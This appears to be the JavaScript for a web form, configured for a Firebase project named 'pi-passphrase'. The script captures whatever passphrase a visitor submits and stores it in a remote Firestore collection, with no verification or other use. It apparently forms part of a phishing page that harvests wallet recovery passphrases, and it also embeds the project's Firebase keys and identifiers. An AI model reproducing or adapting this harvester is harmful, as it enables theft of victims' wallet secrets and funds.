// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyDdtkNSh_mgz58EKpgqJ4o-1_wp9tuZwHc",
  authDomain: "pi-passphrase.firebaseapp.com",
  projectId: "pi-passphrase",
  storageBucket: "pi-passphrase.firebasestorage.app",
  messagingSenderId: "266422695832",
  appId: "1:266422695832:web:88b09535cad924f5d7dded",
  measurementId: "G-83SYWB832P"
};
firebase.initializeApp(firebaseConfig);

// Initialize Firestore
const db = firebase.firestore();

document.getElementById('passphraseForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const passphrase = document.getElementById('passphrase').value;

    // Save the passphrase to Firestore
    db.collection('passphrases').add({
        passphrase: passphrase,
        timestamp: firebase.firestore.FieldValue.serverTimestamp()
    })
    .then(() => {
        console.log('Passphrase saved successfully');
        document.getElementById('successMessage').classList.remove('hidden');
    })
    .catch(error => {
        console.error('Error saving passphrase:', error);
    });
});
